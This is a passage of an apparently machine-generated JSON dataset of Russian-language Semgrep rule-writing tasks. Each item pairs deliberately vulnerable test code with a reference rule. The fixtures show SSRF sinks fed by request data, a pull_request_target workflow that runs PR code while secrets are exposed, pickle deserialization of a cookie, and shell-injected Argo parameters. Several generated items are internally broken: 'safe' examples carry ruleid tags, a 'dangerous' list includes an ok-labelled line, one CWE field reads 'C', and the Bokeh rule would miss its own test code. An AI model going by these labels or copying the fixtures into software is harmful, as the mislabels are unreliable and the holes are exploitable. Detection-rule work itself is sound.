azure-keyvault-enables-firewall-rules-settings\n- Язык: hcl \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "azure-keyvault-enables-firewall-rules-settings",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: wp-ssrf-audit\nОписание уязвимости: Detected usage of vulnerable functions with user input, which could lead to SSRF vulnerabilities.\nCWE: C\nТип анализа: taint\nЯзык: php\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: php\n- Тип анализа: taint\n- CWE: C\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: wp-ssrf-audit.php\n<?php\n\n$url = $_GET['url'];\n// ruleid: wp-ssrf-audit\n$response = wp_remote_get($url);\n\n$url = $_GET['url'];\n// ruleid: wp-ssrf-audit\n$response = wp_safe_remote_get($url);\n\n$url = $_GET['url'];\n// ruleid: wp-ssrf-audit\n$response = wp_safe_remote_request($url);\n\n$url = $_GET['url'];\n// ruleid: wp-ssrf-audit\n$response = wp_safe_remote_head($url);\n\n$url = $_GET['url'];\n// ruleid: wp-ssrf-audit\n$response = wp_oembed_get($url);\n\n$url = $_GET['url'];\n// ruleid: wp-ssrf-audit\n$response = vip_safe_wp_remote_get($url);\n\n$url = $_GET['url'];\n// ruleid: wp-ssrf-audit\n$response = wp_safe_remote_post($url);\n\n// ruleid: wp-ssrf-audit\n$response = wp_remote_get($_POST['link']);\n\n// ruleid: wp-ssrf-audit\n$response = wp_safe_remote_post($_POST['link']);\n\n// ruleid: wp-ssrf-audit\n$response = wp_remote_get($_REQUEST['target']);\n\n// ruleid: wp-ssrf-audit\n$response = wp_safe_remote_request($_REQUEST['target']);\n\n$url = get_option('external_api_url');\n// ruleid: wp-ssrf-audit\n$response = wp_remote_get($url);\n\n$url = get_user_meta(get_current_user_id(), 'custom_api', true);\n// ruleid: wp-ssrf-audit\n$response = wp_remote_get($url);\n\n$url = get_query_var('redirect_url');\n// ruleid: wp-ssrf-audit\n$response = wp_remote_get($url);\n\n// ok: wp-ssrf-audit\n$response = wp_remote_get('https://example.com/api/data');\n\n?>  # Ограничиваем длину\n\nОпасные паттерны:\n• response = wp_remote_get($_GET['url'])\n• response = wp_safe_remote_get($_POST['url'])\n• response = wp_safe_remote_request($_REQUEST['target'])\n\nБезопасные паттерны:  \n• response = wp_remote_get('https://example.com/api/data')\n• response = wp_remote_get(get_option('external_api_url')) // ruleid: wp-ssrf-audit\n• response = wp_safe_remote_get(get_user_meta(get_current_user_id(), 'custom_api', true)) // ruleid: wp-ssrf-audit\n\nЛегенда аннотаций:\n- // ruleid:wp-ssrf-audit: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:wp-ssrf-audit: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: wp-ssrf-audit\n  languages:\n  - php\n  severity: WARNING\n  message: Detected usage of vulnerable functions with user input, which could lead\n    to SSRF vulnerabilities.\n  mode: taint\n  pattern-sources:\n    - patterns:\n      - pattern-either:\n        - pattern: $_GET[...]\n        - pattern: $_POST[...]\n        - pattern: $_REQUEST[...]\n        - pattern: get_option(...)\n        - pattern: get_user_meta(...)\n        - pattern: get_query_var(...)\n  pattern-sinks:\n    - patterns:\n      - focus-metavariable: $URL\n      - pattern-either:\n        - pattern: wp_remote_get($URL, ...)\n        - pattern: wp_safe_remote_get($URL, ...)\n        - pattern: wp_safe_remote_request($URL, ...)\n        - pattern: wp_safe_remote_head($URL, ...)\n        - pattern: wp_oembed_get($URL, ...)\n        - pattern: vip_safe_wp_remote_get($URL, ...)\n        - pattern: wp_safe_remote_post($URL, ...)\n  paths:\n    include:\n    - '**/wp-content/plugins/**/*.php'\n  metadata:\n    cwe: 'CWE-918: Server-Side Request Forgery (SSRF)'\n    owasp: A10:2021 - Server-Side Request Forgery (SSRF)\n    category: security\n    confidence: MEDIUM\n    likelihood: MEDIUM\n    impact: HIGH\n    subcategory:\n    - audit\n    technology:\n    - Wordpress Plugins\n    references:\n    - https://developer.wordpress.org/reference/functions/wp_safe_remote_get/\n    - https://developer.wordpress.org/reference/functions/wp_remote_get/\n    - https://patchstack.com/articles/exploring-the-unpatched-wordpress-ssrf/\n    vulnerability_class:\n    - Server-Side Request Forgery (SSRF)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования небезопасных функций WordPress, таких как wp_remote_get и wp_safe_remote_get, с пользовательским вводом, который может привести к SSRF-уязвимостям. Источники (sources) определяются как переменные GET, POST и REQUEST, а также функции получения опций, метаданных пользователей и параметров запроса. Синки (sinks) включают вызовы этих функций с передачей переменной URL. Правило применимо только к файлам PHP в папке wp-content/plugins.\n\n# Ключевые элементы:\n- ID: wp-ssrf-audit\n- Язык: php \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "wp-ssrf-audit",
      "language": "php",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: pull-request-target-code-checkout\nОписание уязвимости: This GitHub Actions workflow file uses `pull_request_target` and checks out code from the incoming pull request. When using `pull_request_target`, the Action runs in the context of the target repository, which includes access to all repository secrets. Normally, this is safe because the Action only runs code from the target repository, not the incoming PR. However, by checking out the incoming PR code, you're now using the incoming code for the rest of the action. You may be inadvertently executing arbitrary code from the incoming PR with access to repository secrets, which would let an attacker steal repository secrets. This normally happens by running build scripts (e.g., `npm build` and `make`) or dependency installation scripts (e.g., `python setup.py install`). Audit your workflow file to make sure no code from the incoming PR is executed. Please see https://securitylab.github.com/research/github-actions-preventing-pwn-requests/ for additional mitigations.\nCWE: CWE-913: Improper Control of Dynamically-Managed Code Resources\nТип анализа: search\nЯзык: yaml",
    "input": "Требования:\n- Язык: yaml\n- Тип анализа: search\n- CWE: CWE-913: Improper Control of Dynamically-Managed Code Resources\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: pull-request-target-code-checkout.test.yaml\n# cf. https://securitylab.github.com/research/github-actions-preventing-pwn-requests/\n# INSECURE. Provided as an example only.\non:\n  pull_request_target:\n  pull_request:\n\njobs:\n  build:\n    name: Build and test\n    runs-on: ubuntu-latest\n    steps:\n      # ruleid: pull-request-target-code-checkout\n      - uses: actions/checkout@v2\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n\n      - uses: actions/setup-node@v1\n      - run: |\n          npm install\n          npm build\n\n      - uses: completely/fakeaction@v2\n        with:\n          arg1: ${{ secrets.supersecret }}\n\n      - uses: fakerepo/comment-on-pr@v1\n        with:\n          message: |\n            Thank you!\n\n  build2:\n    name: Build and test 2\n    runs-on: ubuntu-latest\n    steps:\n      # ruleid: pull-request-target-code-checkout\n      - uses: actions/checkout@v2.3.4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n\n      - uses: actions/setup-node@v1\n      - run: |\n          npm install\n          npm build\n\n      - uses: completely/fakeaction@v2\n        with:\n          arg1: ${{ secrets.supersecret }}\n\n      - uses: fakerepo/comment-on-pr@v1\n        with:\n          message: |\n            Thank you!\n\n  this-is-safe-because-no-checkout:\n    name: Echo\n    runs-on: ubuntu-latest\n    steps:\n      # ok: pull-request-target-code-checkout\n      - name: echo\n        run: |\n          echo \"Hello, world\"\n\n  # cf. https://github.com/justinsteven/advisories/blob/master/2021_github_actions_checkspelling_token_leak_via_advice_symlink.md\n  spelling:\n    name: Spell checking\n    runs-on: ubuntu-latest\n    steps:\n      # ruleid: pull-request-target-code-checkout\n      - name: checkout-merge\n        if: contains(github.event_name, 'pull_request')\n        uses: actions/checkout@v2\n        with:\n          ref: refs/pull/${{github.event.pull_request.number}}/merge  # Ограничиваем длину\n\nОпасные паттерны:\n• on:\n  pull_request_target:\n  pull_request:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v2\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n• on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v2.3.4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n\nБезопасные паттерны:  \n• on:\n  pull_request:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v2\n        with:\n          ref: ${{ github.ref }}\n• on:\n  push:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v2\n        with:\n          ref: ${{ github.ref }}\n\nЛегенда аннотаций:\n- // ruleid:pull-request-target-code-checkout: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:pull-request-target-code-checkout: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: pull-request-target-code-checkout\n  languages:\n  - yaml\n  message: >-\n    This GitHub Actions workflow file uses `pull_request_target` and checks out code\n    from the incoming pull request. When using `pull_request_target`, the Action\n    runs in the context of the target repository, which includes access to all repository\n    secrets. Normally, this is safe because the Action only runs code from the target\n    repository, not the incoming PR. However, by checking out the incoming PR code, you're now using\n    the incoming code for the rest of the action. You may be inadvertently executing arbitrary code\n    from the incoming PR with access to repository secrets, which would let an attacker steal repository\n    secrets.\n    This normally happens by running build scripts (e.g., `npm build` and `make`) or dependency installation\n    scripts (e.g., `python setup.py install`).\n    Audit your workflow file to make sure no code from the incoming PR is executed.\n    Please see https://securitylab.github.com/research/github-actions-preventing-pwn-requests/ for additional\n    mitigations.\n  metadata:\n    category: security\n    owasp:\n    - A01:2021 - Broken Access Control\n    cwe:\n    - 'CWE-913: Improper Control of Dynamically-Managed Code Resources'\n    references:\n    - https://securitylab.github.com/research/github-actions-preventing-pwn-requests/\n    - https://github.com/justinsteven/advisories/blob/master/2021_github_actions_checkspelling_token_leak_via_advice_symlink.md\n    technology:\n    - github-actions\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n  patterns:\n  - pattern-either:\n    - pattern-inside: |\n        on:\n          ...\n          pull_request_target: ...\n          ...\n        ...\n    - pattern-inside: |\n        on: [..., pull_request_target, ...]\n        ...\n    - pattern-inside: |\n        on: pull_request_target\n        ...\n  - pattern-inside: |\n      jobs:\n        ...\n        $JOBNAME:\n          ...\n          steps:\n            ...\n  - pattern: |\n      ...\n      uses: \"$ACTION\"\n      with:\n        ...\n        ref: $EXPR\n  - metavariable-regex:\n      metavariable: $ACTION\n      regex: actions/checkout@.*\n  - metavariable-pattern:\n      language: generic\n      metavariable: $EXPR\n      patterns:\n      - pattern: ${{ github.event.pull_request ... }}\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования действия `pull_request_target` в файле workflow YAML вместе с инструкцией `uses: actions/checkout@v2` или аналогичной, где параметр `ref` содержит выражение, ссылающееся на событие pull request (`${{ github.event.pull_request.head.sha }}`), что позволяет выполнить код из входящего pull request вместо целевого репозитория.\n\n# Ключевые элементы:\n- ID: pull-request-target-code-checkout\n- Язык: yaml \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "pull-request-target-code-checkout",
      "language": "yaml",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: bokeh-deprecated-apis\nОписание уязвимости: These APIs are deprecated in Bokeh see https://docs.bokeh.org/en/latest/docs/releases.html#api-deprecations\nCWE: \nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: deprecated_apis.py\n# ruleid:bokeh-deprecated-apis\nfrom bokeh.layouts import widgetbox\n# ruleid:bokeh-deprecated-apis\nfrom bokeh.models.graphs import from_networkx\n\nwidgetbox(children=[slider], sizing_mode='scale_width')\n\ngraph_renderer = from_networkx(G, nx.spring_layout, scale=0.5, center=(0,0))  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: deprecated_apis.py\n# ruleid:bokeh-deprecated-apis\nfrom bokeh.layouts import widgetbox\n• // File: deprecated_apis.py\n# ruleid:bokeh-deprecated-apis\nfrom bokeh.models.graphs import from_networkx\n\nБезопасные паттерны:  \n• // File: safe_code.py\nfrom bokeh.layouts import column\n• // File: safe_code.py\nfrom bokeh.models import ColumnDataSource\n\nЛегенда аннотаций:\n- // ruleid:bokeh-deprecated-apis: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:bokeh-deprecated-apis: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: bokeh-deprecated-apis\n    message: >-\n      These APIs are deprecated in Bokeh see https://docs.bokeh.org/en/latest/docs/releases.html#api-deprecations\n    languages: [python]\n    severity: WARNING\n    pattern-either:\n      - pattern: |\n          import bokeh.layouts.widgetbox\n      - pattern: |\n          import bokeh.models.graphs.from_networkx\n    metadata:\n      category: maintainability\n      technology:\n        - bokeh\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска импортов устаревших API в библиотеке Bokeh. Тип анализа — поиск (search). Правило использует конструкцию 'pattern-either', которая означает, что либо первый шаблон ('import bokeh.layouts.widgetbox'), либо второй шаблон ('import bokeh.models.graphs.from_networkx') должны быть найдены в коде. Это позволяет охватить оба варианта импорта устаревшего API.\n\n# Ключевые элементы:\n- ID: bokeh-deprecated-apis\n- Язык: python \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "bokeh-deprecated-apis",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: insecure-deserialization\nОписание уязвимости: Detected the use of an insecure deserialization library in a Flask route. These libraries are prone to code execution vulnerabilities. Ensure user data does not enter this function. To fix this, try to avoid serializing whole objects. Consider instead using a serializer such as JSON.\nCWE: CWE-502: Deserialization of Untrusted Data\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-502: Deserialization of Untrusted Data\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: insecure-deserialization.py\n# example from https://medium.com/gdg-vit/deserialization-attacks-d312fbe58e7d\n# flask_app.py\nimport os\nimport pickle\nfrom uuid import uuid1\nfrom flask import Flask, make_response, request\nfrom base64 import b64encode, b64decode\n# The User Class which assigns a random ID to each connection\nclass UserID:\n    def __init__(self, uuid=None):\n        self.uuid = str(uuid1())\n    def __str__(self):\n        return self.uuid\n\n# The main Flask Backend\napp = Flask(__name__)\n\n@app.route('/', methods=['GET'])\ndef index():\n    user_obj = request.cookies.get('uuid')\n    if user_obj == None:\n        msg = \"Seems like you didn't have a cookie. No worries! I'll set one now!\"\n        response = make_response(msg)\n        user_obj = UserID()\n        # ruleid:insecure-deserialization\n        response.set_cookie('uuid', b64encode(pickle.dumps(user_obj)))\n        return response\n    else:\n        # ruleid:insecure-deserialization\n        return \"Hey there! {}!\".format(pickle.loads(b64decode(user_obj)))\n\n@app.route(\"/ok\")\ndef ok():\n    # ok:insecure-deserialization\n    novellist = pickle.load(open('./novel/list.dat', \"rb\"))\n\nif __name__ == \"__main__\":\n    # Using host='0.0.0.0' to accept connections from all IPs\n    app.run(host='0.0.0.0')  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: insecure-deserialization.py\\n... \\n@app.route('/')\\ndef index():...\\n    # ruleid:insecure-deserialization\\n    response.set_cookie('uuid', b64encode(pickle.dumps(user_obj)))\n• // File: insecure-deserialization.py\\n... \\nok:insecure-deserialization\\nnovellist = pickle.load(open('./novel/list.dat', \\\n• ))\n\nБезопасные паттерны:  \n• // Safe example 1\\nimport pickle\\n@app.route('/safe_route')\\ndef safe_function():\\n    serialized_data = pickle.dumps(safe_object)\\n    # safe usage\\n\n• // Safe example 2\\nimport yaml\\n@app.route('/safe_route')\\ndef safe_function():\\n    # safe usage\\n    yaml.safe_load(some_input)\n• // Another safe example\\nimport pickle\\n@app.route('/safe_route')\\ndef safe_function():\\n    # safe usage\\n    some_input = 'safe string'\\n    deserialized_data = pickle.loads(some_input)\n\nЛегенда аннотаций:\n- // ruleid:insecure-deserialization: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:insecure-deserialization: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: insecure-deserialization\n  metadata:\n    owasp:\n    - A08:2017 - Insecure Deserialization\n    - A08:2021 - Software and Data Integrity Failures\n    cwe:\n    - 'CWE-502: Deserialization of Untrusted Data'\n    references:\n    - https://docs.python.org/3/library/pickle.html\n    category: security\n    technology:\n    - flask\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n  message: >-\n    Detected the use of an insecure deserialization library in a Flask route. These libraries\n    are prone to code execution vulnerabilities. Ensure user data does not enter this function.\n    To fix this, try to avoid serializing whole objects. Consider instead using a serializer\n    such as JSON.\n  languages:\n  - python\n  severity: ERROR\n  patterns:\n  - pattern-inside: |\n      @app.route(...)\n      def $X(...):\n        ...\n  - pattern-not: $MODULE.$FUNC(\"...\")\n  - pattern-not: $MODULE.$FUNC(open(\"...\", ...))\n  - pattern-either:\n    - pattern: pickle.$FUNC(...)\n    - pattern: _pickle.$FUNC(...)\n    - pattern: cPickle.$FUNC(...)\n    - pattern: dill.$FUNC(...)\n    - pattern: shelve.$FUNC(...)\n    - pattern: yaml.load(...)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования небезопасных библиотек десериализации в маршрутах Flask. Оно ищет вызовы функций сериализации/десериализации, таких как pickle.*, _pickle.*, cPickle.*, dill.*, shelve.* и yaml.load(), внутри маршрутов Flask (@app.route). Исключение составляют случаи, когда функции используются внутри вызовов open() или имеют строковые аргументы, явно указывающие на безопасное поведение.\n\n# Ключевые элементы:\n- ID: insecure-deserialization\n- Язык: python \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "insecure-deserialization",
      "language": "python",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: gcp-gke-client-certificate-disabled\nОписание уязвимости: Ensure client certificate authentication to Kubernetes Engine Clusters is disabled\nCWE: CWE-1220: Insufficient Granularity of Access Control\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-1220: Insufficient Granularity of Access Control\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: gcp-gke-client-certificate-disabled.tf\n# ok: gcp-gke-client-certificate-disabled\nresource \"google_container_cluster\" \"fail\" {\n  name               = \"marcellus-wallace\"\n  location           = \"us-central1-a\"\n  initial_node_count = 3\n  master_auth {\n    client_certificate_config {\n        issue_client_certificate = false\n    }\n  }\n}\n\n# fail\n# ruleid: gcp-gke-client-certificate-disabled\nresource \"google_container_cluster\" \"success\" {\n  name               = \"marcellus-wallace\"\n  location           = \"us-central1-a\"\n  initial_node_count = 3\n  master_auth {\n    client_certificate_config {\n        issue_client_certificate = true\n    }\n  }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"google_container_cluster\" \"success\" { ... master_auth { ... client_certificate_config { issue_client_certificate = true } ... } ... }\n• resource \"google_container_cluster\" \"another-fail\" { ... master_auth { ... client_certificate_config { issue_client_certificate = true } ... } ... }\n\nБезопасные паттерны:  \n• resource \"google_container_cluster\" \"fail\" { ... master_auth { ... client_certificate_config { issue_client_certificate = false } ... } ... }\n• resource \"google_container_cluster\" \"ok\" { ... master_auth { ... client_certificate_config { issue_client_certificate = false } ... } ... }\n\nЛегенда аннотаций:\n- // ruleid:gcp-gke-client-certificate-disabled: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:gcp-gke-client-certificate-disabled: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: gcp-gke-client-certificate-disabled\n  patterns:\n  - pattern: resource\n  - pattern-inside: |\n      resource \"google_container_cluster\" \"...\" {\n      ...\n      }\n  - pattern-not-inside: |\n      resource \"google_container_cluster\" \"...\" {\n      ...\n      master_auth {\n        ...\n        client_certificate_config {\n          ...\n          issue_client_certificate = false\n          ...\n        }\n        ...\n      }\n      ...\n      }\n  message: >-\n    Ensure client certificate authentication to Kubernetes Engine Clusters is disabled\n  metadata:\n    owasp:\n    - A05:2017 - Broken Access Control\n    - A01:2021 - Broken Access Control\n    cwe:\n    - 'CWE-1220: Insufficient Granularity of Access Control'\n    category: security\n    technology:\n    - terraform\n    - gcp\n    references:\n    - https://owasp.org/Top10/A01_2021-Broken_Access_Control\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов Google Container Cluster в конфигурациях Terraform, где опция issue_client_certificate установлена в значение true. Правило использует шаблон ресурса и проверяет наличие блока master_auth внутри него. Если блок содержит client_certificate_config с установленным issue_client_certificate равным true, то это считается опасным примером, так как клиентские сертификаты разрешают аутентификацию в кластере Kubernetes Engine. Безопасный пример — когда issue_client_certificate установлено в false.\n\n# Ключевые элементы:\n- ID: gcp-gke-client-certificate-disabled\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "gcp-gke-client-certificate-disabled",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения no-static-initialization-vector\nОписание уязвимости: Initialization Vectors (IVs) for block ciphers should be randomly generated each time they are used. Using a static IV means the same plaintext encrypts to the same ciphertext every time, weakening the strength of the encryption.\nCWE: CWE-329: Generation of Predictable IV with CBC Mode\nТип анализа: search\nЯзык: java",
    "input": "Требования:\n- Язык: java\n- Тип анализа: search\n- CWE: CWE-329: Generation of Predictable IV with CBC Mode\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: no-static-initialization-vector.java\npublic class StaticIV {\n\n    public StaticIV() {\n        // ruleid: no-static-initialization-vector\n        byte[] iv = {\n            (byte) 0, (byte) 0, (byte) 0, (byte) 0,\n            (byte) 0, (byte) 0, (byte) 0, (byte) 0,\n            (byte) 0, (byte) 0, (byte) 0, (byte) 0,\n            (byte) 0, (byte) 0, (byte) 0, (byte) 0\n        };\n\n        IvParameterSpec staticIvSpec = new IvParameterSpec(iv);\n\n        c.init(Cipher.ENCRYPT_MODE, skeySpec, staticIvSpec, new SecureRandom());\n    }\n}\n\n// ruleid: no-static-initialization-vector\npublic class StaticIV2 {\n    // ruleid: no-static-initialization-vector\n    byte[] iv = {\n        (byte) 0, (byte) 0, (byte) 0, (byte) 0,\n        (byte) 0, (byte) 0, (byte) 0, (byte) 0,\n        (byte) 0, (byte) 0, (byte) 0, (byte) 0,\n        (byte) 0, (byte) 0, (byte) 0, (byte) 0\n    };\n\n\n    public StaticIV2() {\n        IvParameterSpec staticIvSpec = new IvParameterSpec(iv);\n\n        c.init(Cipher.ENCRYPT_MODE, skeySpec, staticIvSpec, new SecureRandom());\n    }\n}\n\npublic class RandomIV {\n\n    public RandomIV() {\n        // ok: no-static-initialization-vector\n        byte[] iv = new byte[16];\n        new SecureRandom().nextBytes(iv);\n\n        IvParameterSpec staticIvSpec = new IvParameterSpec(iv); // IvParameterSpec initialized using its own randomizer.\n\n        c.init(Cipher.ENCRYPT_MODE, skeySpec, staticIvSpec, new SecureRandom());\n    }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• byte[] iv = { (byte) 0, (byte) 0, (byte) 0, (byte) 0, (byte) 0, (byte) 0, (byte) 0, (byte) 0, (byte) 0, (byte) 0, (byte) 0, (byte) 0, (byte) 0, (byte) 0, (byte) 0, (byte) 0 };\n• class StaticIV2 {\n    byte[] iv = { (byte) 0, (byte) 0, (byte) 0, (byte) 0,\n        (byte) 0, (byte) 0, (byte) 0, (byte) 0,\n        (byte) 0, (byte) 0, (byte) 0, (byte) 0,\n        (byte) 0, (byte) 0, \n• byte[] iv = {\n        (byte) 0, (byte) 0, (byte) 0, (byte) 0,\n        (byte) 0, (byte) 0, (byte) 0, (byte) 0,\n        (byte) 0, (byte) 0, (byte) 0, (byte) 0,\n        (byte) 0, (byte) 0, (byte) 0, (byt\n\nБезопасные паттерны:  \n• byte[] iv = new byte[16];\nnew SecureRandom().nextBytes(iv);\n• class RandomIV {\n    byte[] iv = new byte[16];\n    new SecureRandom().nextBytes(iv);\n    IvParameterSpec staticIvSpec = new IvParameterSpec(iv);\n• byte[] iv = new byte[16];\nSecureRandom random = new SecureRandom();\nrandom.nextBytes(iv);\n\nЛегенда аннотаций:\n- // ruleid:no-static-initialization-vector: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:no-static-initialization-vector: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: no-static-initialization-vector\n  message: >-\n    Initialization Vectors (IVs) for block ciphers should be randomly generated\n    each time they are used. Using a static IV means the same plaintext\n    encrypts to the same ciphertext every time, weakening the strength\n    of the encryption.\n  metadata:\n    cwe:\n    - 'CWE-329: Generation of Predictable IV with CBC Mode'\n    owasp:\n    - A02:2021 - Cryptographic Failures\n    source-rule-url: https://find-sec-bugs.github.io/bugs.htm#STATIC_IV\n    asvs:\n      section: V6 Stored Cryptography Verification Requirements\n      control_id: 6.2.5 Insecure Algorithm\n      control_url: https://github.com/OWASP/ASVS/blob/master/4.0/en/0x14-V6-Cryptography.md#v62-algorithms\n      version: '4'\n    references:\n    - https://cwe.mitre.org/data/definitions/329.html\n    category: security\n    technology:\n    - java\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: HIGH\n  severity: WARNING\n  languages: [java]\n  pattern-either:\n  - pattern: |\n      byte[] $IV = {\n          ...\n      };\n      ...\n      new IvParameterSpec($IV, ...);\n  - pattern: |\n      class $CLASS {\n          byte[] $IV = {\n              ...\n          };\n          ...\n          $METHOD(...) {\n              ...\n              new IvParameterSpec($IV, ...);\n              ...\n          }\n      }\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования статических векторов инициализации (IV) в блоковых шифрах. Векторы инициализации должны быть случайно генерируемыми при каждом использовании, иначе одно и то же исходное сообщение будет зашифровано в одинаковый шифротекст, что ослабляет безопасность шифрования. Правило ищет объявления массивов байтов с фиксированными значениями, которые затем используются в качестве параметров инициализации для криптографического алгоритма.\n\n# Ключевые элементы:\n- ID: no-static-initialization-vector\n- Язык: java \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "no-static-initialization-vector",
      "language": "java",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения argo-workflow-parameter-command-injection\nОписание уязвимости: Using input or workflow parameters in here-scripts can lead to command injection or code injection. Convert the parameters to env variables instead.\nCWE: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\nТип анализа: search\nЯзык: yaml",
    "input": "Требования:\n- Язык: yaml\n- Тип анализа: search\n- CWE: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: argo-workflow-parameter-command-injection.test.yaml\napiVersion: argoproj.io/v1alpha1\nkind: WorkflowTemplate\nmetadata:\n  generateName: scripts-bash-\nspec:\n  entrypoint: print-message\n  arguments:\n    parameters:\n      - name: message\n  templates:\n    - name: print-message\n      inputs:\n        parameters:\n          - name: message\n      script:\n        image: debian:9.4\n        command: [bash]\n        # ruleid: argo-workflow-parameter-command-injection\n        source: |\n          echo {{inputs.parameters.message}}\n    - name: print-message-sh\n      inputs:\n        parameters:\n          - name: message\n      script:\n        image: debian:9.4\n        command:\n          - sh\n        # ruleid: argo-workflow-parameter-command-injection\n        source: |\n          echo {{inputs.parameters.message}}\n    - name: print-message-python\n      inputs:\n        parameters:\n          - name: message\n      script:\n        image: debian:9.4\n        command: [python]\n        # ruleid: argo-workflow-parameter-command-injection\n        source: |\n          print(\"{{inputs.parameters.message}}\")\n    - script:\n        name: ''\n        image: node:9.1-alpine\n        command:\n          - node\n        resources: {}\n        # ruleid: argo-workflow-parameter-command-injection\n        source: |\n          var rand = Math.floor(Math.random() * 100);\n          console.log(\"{{inputs.parameters.message}}\");\n    - script:\n        name: ''\n        image: ruby:3.0\n        command:\n          - ruby\n        resources: {}\n        # ruleid: argo-workflow-parameter-command-injection\n        source: |\n          puts \"{{inputs.parameters.message}}\"\n    - name: print-message-args\n      inputs:\n        parameters:\n        - name: message\n      container:\n        image: alpine:latest\n        command: [sh, -c]\n        # ruleid: argo-workflow-parameter-command-injection\n        args: [\"echo result was: {{inputs.parameters.message}}\"]\n    - name: print-message-python\n      inputs:\n        parameters:\n         # Ограничиваем длину\n\nОпасные паттерны:\n• apiVersion: argoproj.io/v1alpha1\nkind: WorkflowTemplate\n...\ncommand:\n  - sh\nsource: |\n  echo {{inputs.parameters.message}}\n\n• container:\n  command: [sh]\nargs: ['echo result was: {{inputs.parameters.message}}']\n• containerSet:\n  containers:\n  - command: [python]\n    args:\n    - |\n      print(\"{{inputs.parameters.message}}\")\n\nБезопасные паттерны:  \n• env:\n  name: MESSAGE\n  value: \"{{inputs.parameters.message}}\"\ncommand: [bash]\nsource: |\n  echo $MESSAGE\n• container:\n  env:\n  - name: MESSAGE\n    value: \"{{inputs.parameters.message}}\"\ncommand: [sh, -c]\nargs: ['echo result was: $MESSAGE']\n\nЛегенда аннотаций:\n- // ruleid:argo-workflow-parameter-command-injection: Метка для кода, который 